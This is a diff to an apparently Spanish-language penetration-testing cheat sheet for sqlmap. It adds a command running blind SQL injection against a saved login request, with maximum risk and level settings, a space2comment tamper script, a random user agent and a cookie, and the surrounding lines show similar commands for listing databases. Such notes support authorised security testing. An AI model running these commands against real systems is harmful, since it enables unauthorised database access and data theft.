@@ -74,6 +74,8 @@ sqlmap -u "<URL>" --data='user=a&pass=a' -p user --technique=B --dbs
 #### Usar en formulario de Login cargado desde un archivo, para enviar datos en POST y usando la técnica BLIND, para obtener el nombre de la BD
 ```
 sqlmap -r "<PATH_FILE>" --data='user=a&pass=a' -p user --technique=B --dbs
+
+sqlmap -r "<PATH_FILE>" -p user --user-agent=SQLMAP --random-agent --threads=10 --risk=3 --level=5 --tamper=space2comment --cookie="name:value" --dbs
 ```
 
 ---
